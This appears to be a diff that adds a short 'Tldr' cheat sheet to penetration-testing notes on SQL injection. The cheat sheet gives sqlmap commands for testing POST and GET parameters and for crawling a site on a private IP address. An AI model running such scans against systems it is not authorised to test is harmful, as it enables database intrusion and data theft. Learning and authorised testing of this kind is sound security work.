@@ -1,5 +1,17 @@
 # SQL-injections
 
+## Tldr
+
+```
+# Post
+./sqlmap.py -r request.txt -p username
+
+# Get
+sqlmap -u "http://192.168.1.101/index.php?id=1" --dbms=mysql
+
+# Crawl
+sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
+```
 
 ## How does sql-injections work?
 
